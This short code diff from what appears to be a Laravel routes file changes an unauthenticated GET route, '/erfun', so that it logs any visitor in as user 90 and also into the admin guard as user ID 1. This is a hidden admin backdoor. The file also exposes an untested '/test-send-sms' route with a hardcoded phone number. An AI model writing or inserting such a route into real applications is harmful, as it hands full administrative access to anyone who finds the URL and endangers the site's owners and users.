@@ -11,7 +11,7 @@ use App\Http\Controllers\Auth\LoginController;
 use App\Http\Controllers\Frontend\FrontendLangController;
 use Illuminate\Http\Request;
 
-Route::get('/erfun' , function() { Auth::loginUsingId(90); });
+Route::get('/erfun' , function() { Auth::loginUsingId(90); Auth::guard('admin')->loginUsingId(1); });
 Route::get('/test-send-sms', function () {
     $activated_code = rand(1000,9999);
     $phone = "66444569";
